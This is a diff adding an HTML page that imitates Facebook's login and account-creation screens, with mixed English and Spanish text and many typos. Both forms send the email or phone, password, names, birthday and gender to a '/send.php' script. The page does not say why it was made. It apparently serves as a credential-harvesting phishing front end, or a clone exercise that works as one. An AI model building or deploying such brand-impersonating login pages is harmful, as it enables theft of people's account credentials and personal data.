@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link rel="stylesheet" href="css.css" />
+    <title>registro de facebook</title>
+  </head>
+  <body>
+    <div class="primero">
+      <form name="Registro" action="/send.php" method="post">
+
+        <div class="forma">
+          <div class="texto">
+            <p>Email or phone</p>
+            <input type="email" name="e-mail" autocomplete="off" />
+          </div>
+        </div>
+
+        <div class="forma">
+          <div class="texto">
+            <p>Password</p>
+            <input type="password" name="password" />
+            <p><a class="lin" href="#">Forgotten account?</a></p>
+          </div>
+        </div>
+
+        <input type="hidden" name="información" value="87960" />
+        <button class="bot">Log in</button>
+      </form>
+    </div>
+    </div>
+
+    <div class="dos">
+      <h3>Create a new account</h3>
+      <h5>it´s free and always will be.</h5>
+      <form name="Formulario" action="/send.php" method="post">
+        <input type="text" name="nombre" placeholder="Firts name" />
+        <input type="text" name="nombre" placeholder="Sumame" />
+        <br/> <br>
+        <input type="text" name="" id="" />
+
+        <br/> <br>
+        <input type="password" name="password" placeholder="New password" />
+        <br />
+        <br />
+        <h4>Brirthday</h4>
+        <input
+          class="lado"
+          type="date"
+          name="date"
+          min="01-01-2000"
+          max="01-01-1900"
+        />
+
+        <a class="azul" href="#">Why do I need to provide my date or birth?</a>
+        <br/>
+        <input type="radio" name="genero" value="H" />Famale
+        <input type="radio" name="genero" value="M" />Male
+
+        <p>
+          Al hacer clic en "Registrarte", aceptas nuestras <a href="#">Condiciones</a>, 
+          la <a href="#">Política de datos</a> y la
+          <a href="#">Política de cookies</a>. Es posible que te enviemos
+          notificaciones por SMS, que puedes desactivar cuando quieras.
+        </p>
+
+        <button class="bo">Create Account</button>
+      </form>
+    </div>
+  </body>
+</html>
